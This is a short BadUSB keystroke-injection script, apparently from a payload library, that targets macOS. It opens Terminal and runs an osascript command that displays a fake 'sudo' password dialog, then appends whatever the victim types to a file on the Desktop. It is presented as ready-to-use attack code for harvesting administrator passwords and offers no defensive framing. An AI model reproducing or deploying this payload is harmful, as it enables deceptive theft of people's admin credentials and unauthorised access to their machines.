REM Title: macOS Sudo Password Harvester
REM Author: BadUSB Library
REM Description: Creates fake sudo prompt to harvest admin passwords
REM Target: macOS 10.15+
REM Category: Authentication
REM Type: Directly Ready

REM Open Terminal
DELAY 2000
GUI SPACE
DELAY 1000
STRING Terminal
ENTER
DELAY 3000

REM Create simple fake sudo prompt
STRING osascript -e 'set password to text returned of (display dialog "Password:" default answer "" with hidden answer buttons {"OK"} default button "OK" with title "sudo" with icon caution)' -e 'do shell script "echo \"Password captured: " & password & "\" >> ~/Desktop/sudo_passwords.txt"'
ENTER
DELAY 3000
